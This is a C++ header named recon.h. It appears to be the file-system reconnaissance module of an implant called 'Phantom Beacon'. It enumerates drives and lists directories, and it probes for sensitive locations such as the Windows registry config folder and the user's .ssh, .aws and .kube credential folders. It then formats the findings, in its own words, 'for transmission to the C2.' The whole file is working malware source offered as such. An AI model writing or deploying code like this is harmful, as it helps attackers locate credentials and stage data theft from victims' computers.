#pragma once
// ============================================================================
//  recon.h — Phantom Beacon File System Reconnaissance
//  ─────────────────────────────────────────────────────
//  Enumerate logical drives, traverse directories, locate sensitive files.
// ============================================================================

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <string>
#include <vector>
#include <sstream>

namespace recon {

// ── Drive Enumeration ──────────────────────────────────────────────────────

struct DriveInfo {
    std::string letter;     // "C:\\"
    std::string type;       // "Fixed", "Removable", "Network", etc.
    uint64_t totalBytes;
    uint64_t freeBytes;
};

inline std::string drive_type_str(UINT type) {
    switch (type) {
        case DRIVE_REMOVABLE: return "Removable";
        case DRIVE_FIXED:     return "Fixed";
        case DRIVE_REMOTE:    return "Network";
        case DRIVE_CDROM:     return "CD-ROM";
        case DRIVE_RAMDISK:   return "RAMDisk";
        default:              return "Unknown";
    }
}

inline std::vector<DriveInfo> enumerate_drives() {
    std::vector<DriveInfo> drives;
    char buf[512];
    DWORD len = GetLogicalDriveStringsA(sizeof(buf), buf);
    if (len == 0 || len > sizeof(buf)) return drives;

    for (char* p = buf; *p; p += strlen(p) + 1) {
        DriveInfo di;
        di.letter = p;
        di.type = drive_type_str(GetDriveTypeA(p));
        di.totalBytes = 0;
        di.freeBytes = 0;

        ULARGE_INTEGER freeAvail, total, totalFree;
        if (GetDiskFreeSpaceExA(p, &freeAvail, &total, &totalFree)) {
            di.totalBytes = total.QuadPart;
            di.freeBytes = totalFree.QuadPart;
        }
        drives.push_back(di);
    }
    return drives;
}

// ── Directory Listing ──────────────────────────────────────────────────────

struct FileEntry {
    std::string name;
    bool        isDir;
    uint64_t    size;      // 0 for directories
};

inline std::vector<FileEntry> list_directory(const std::string& path) {
    std::vector<FileEntry> entries;
    std::string searchPath = path;
    if (searchPath.back() != '\\') searchPath += '\\';
    searchPath += '*';

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return entries;

    do {
        std::string name = fd.cFileName;
        if (name == "." || name == "..") continue;

        FileEntry fe;
        fe.name  = name;
        fe.isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        fe.size  = (static_cast<uint64_t>(fd.nFileSizeHigh) << 32) | fd.nFileSizeLow;
        entries.push_back(fe);
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    return entries;
}

// ── Sensitive File/Directory Detection ─────────────────────────────────────
// Returns a list of "interesting" paths found on the system

inline std::vector<std::string> find_critical_paths() {
    std::vector<std::string> found;
    
    // Paths to check for existence
    const char* interesting[] = {
        "C:\\Users",
        "C:\\Windows\\System32\\config",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\ProgramData",
        "C:\\inetpub",
        "C:\\xampp",
        "C:\\wamp",
        nullptr
    };

    for (int i = 0; interesting[i]; ++i) {
        DWORD attrs = GetFileAttributesA(interesting[i]);
        if (attrs != INVALID_FILE_ATTRIBUTES) {
            found.push_back(interesting[i]);
        }
    }

    // Enumerate user profile directories
    char userProfile[MAX_PATH];
    if (GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH)) {
        std::string up = userProfile;
        const char* subDirs[] = {
            "\\Desktop", "\\Documents", "\\Downloads",
            "\\AppData\\Roaming", "\\AppData\\Local",
            "\\.ssh", "\\.aws", "\\.kube",
            nullptr
        };
        for (int i = 0; subDirs[i]; ++i) {
            std::string full = up + subDirs[i];
            DWORD attrs = GetFileAttributesA(full.c_str());
            if (attrs != INVALID_FILE_ATTRIBUTES) {
                found.push_back(full);
            }
        }
    }
    return found;
}

// ── Format Output ──────────────────────────────────────────────────────────
// Formats all recon data as a single string for transmission to the C2.

inline std::string format_human(const std::string& targetPath = "") {
    std::ostringstream out;

    // 1. Drives
    out << "=== LOGICAL DRIVES ===\n";
    auto drives = enumerate_drives();
    for (auto& d : drives) {
        double totalGB = d.totalBytes / (1024.0 * 1024.0 * 1024.0);
        double freeGB  = d.freeBytes  / (1024.0 * 1024.0 * 1024.0);
        out << "  " << d.letter << "  [" << d.type << "]"
            << "  Total: " << static_cast<int>(totalGB) << " GB"
            << "  Free: "  << static_cast<int>(freeGB)  << " GB\n";
    }

    // 2. Critical paths
    out << "\n=== CRITICAL PATHS ===\n";
    auto paths = find_critical_paths();
    for (auto& p : paths) {
        out << "  [FOUND] " << p << "\n";
    }

    // 3. Target directory listing (if specified)
    if (!targetPath.empty()) {
        out << "\n=== DIRECTORY: " << targetPath << " ===\n";
        auto entries = list_directory(targetPath);
        for (auto& e : entries) {
            if (e.isDir) {
                out << "  [DIR]  " << e.name << "\n";
            } else {
                out << "  [FILE] " << e.name << "  (" << e.size << " bytes)\n";
            }
        }
    }

    return out.str();
}

}  // namespace recon
